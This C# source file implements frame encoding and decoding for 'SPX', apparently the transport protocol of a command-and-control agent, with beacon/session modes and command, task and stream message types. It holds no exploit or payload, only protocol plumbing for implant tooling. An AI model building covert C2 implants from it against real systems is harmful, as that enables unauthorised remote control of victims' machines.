using System.Buffers.Binary;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace SpxAgent;

// SPX frame format (big-endian), mirrors server/c2/spx.go:
//
//	[0:4]   magic   0x53315854  "S1XT"
//	[4]     version 0x01
//	[5]     flags   0x01=compressed 0x02=close 0x04=stream-cont
//	[6:10]  header  length (uint32)
//	[10:14] payload length (uint32)
//	[14:]   JSON header, then raw payload

public class SpxHeader
{
    // v: protocol version
    [JsonPropertyName("v")] public int V { get; set; } = 1;
    // t: message type (AUTH|AUTH_OK|REG|REG_OK|CMD|RES|TASK|TASK_RES|PING|PONG|OPEN|DATA|CLOSE|ERR)
    [JsonPropertyName("t")] public string T { get; set; } = "";
    // i: message id / r: request id (16 hex)
    [JsonPropertyName("i")] public string? I { get; set; }
    [JsonPropertyName("r")] public string? R { get; set; }
    // c: opcode
    [JsonPropertyName("c")] public uint C { get; set; }
    // s: session/beacon id
    [JsonPropertyName("s")] public string? S { get; set; }
    // ts: epoch milliseconds
    [JsonPropertyName("ts")] public long TS { get; set; }
    // f: flags (0x01=session mode, 0x02=beacon mode)
    [JsonPropertyName("f")] public int F { get; set; }
    // m: REG metadata or AUTH reply {pubkey, sig}
    [JsonPropertyName("m")] public JsonElement? M { get; set; }
    // k: stream/channel key
    [JsonPropertyName("k")] public string? K { get; set; }
    // e: error message (ERR)
    [JsonPropertyName("e")] public string? E { get; set; }
    // msg/body: self-describing command name + protojson body
    [JsonPropertyName("msg")] public string? Msg { get; set; }
    [JsonPropertyName("body")] public JsonElement? Body { get; set; }
}

public static class Frame
{
    private const uint Magic = 0x53315854; // "S1XT"
    private const byte Version = 0x01;
    private const uint MaxHeaderLen = 64 * 1024;          // 64 KiB
    private const uint MaxPayloadLen = 256 * 1024 * 1024; // 256 MiB

    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        PropertyNamingPolicy = null, // field names are the JsonPropertyName attrs
    };

    public static async Task WriteAsync(Stream stream, SpxHeader hdr, byte[]? payload = null)
    {
        payload ??= Array.Empty<byte>();
        byte[] headerJson = JsonSerializer.SerializeToUtf8Bytes(hdr, JsonOpts);
        if (headerJson.Length > MaxHeaderLen)
            throw new InvalidOperationException($"SPX header too large ({headerJson.Length} > {MaxHeaderLen})");
        if (payload.Length > MaxPayloadLen)
            throw new InvalidOperationException($"SPX payload too large ({payload.Length} > {MaxPayloadLen})");

        byte[] frameHead = new byte[14];
        BinaryPrimitives.WriteUInt32BigEndian(frameHead.AsSpan(0, 4), Magic);
        frameHead[4] = Version;
        frameHead[5] = 0; // flags
        BinaryPrimitives.WriteUInt32BigEndian(frameHead.AsSpan(6, 4), (uint)headerJson.Length);
        BinaryPrimitives.WriteUInt32BigEndian(frameHead.AsSpan(10, 4), (uint)payload.Length);

        await stream.WriteAsync(frameHead);
        await stream.WriteAsync(headerJson);
        if (payload.Length > 0)
            await stream.WriteAsync(payload);
    }

    public static async Task<(SpxHeader Header, byte[] Payload)> ReadAsync(Stream stream)
    {
        byte[] headBuf = new byte[14];
        await ReadExactAsync(stream, headBuf);
        uint magic = BinaryPrimitives.ReadUInt32BigEndian(headBuf.AsSpan(0, 4));
        if (magic != Magic)
            throw new InvalidDataException($"SPX bad magic 0x{magic:X8}");
        byte version = headBuf[4];
        if (version != Version)
            throw new InvalidDataException($"SPX unsupported version {version}");
        uint headerLen = BinaryPrimitives.ReadUInt32BigEndian(headBuf.AsSpan(6, 4));
        uint payloadLen = BinaryPrimitives.ReadUInt32BigEndian(headBuf.AsSpan(10, 4));
        if (headerLen > MaxHeaderLen)
            throw new InvalidDataException($"SPX header too large ({headerLen} > {MaxHeaderLen})");
        if (payloadLen > MaxPayloadLen)
            throw new InvalidDataException($"SPX payload too large ({payloadLen} > {MaxPayloadLen})");

        byte[] headerJson = new byte[headerLen];
        await ReadExactAsync(stream, headerJson);

        SpxHeader? hdr = JsonSerializer.Deserialize<SpxHeader>(headerJson, JsonOpts);
        if (hdr is null)
            throw new InvalidDataException("SPX failed to decode header");

        byte[] payload = Array.Empty<byte>();
        if (payloadLen > 0)
        {
            payload = new byte[payloadLen];
            await ReadExactAsync(stream, payload);
        }
        return (hdr, payload);
    }

    private static async Task ReadExactAsync(Stream stream, byte[] buf)
    {
        int off = 0;
        while (off < buf.Length)
        {
            int n = await stream.ReadAsync(buf.AsMemory(off));
            if (n == 0)
                throw new EndOfStreamException("SPX unexpected EOF");
            off += n;
        }
    }

    // NewId - 16-hex message id (matches server spxNewMsgID).
    public static string NewId() => Guid.NewGuid().ToString("N")[..16];

    public static long NowMillis() => DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
}
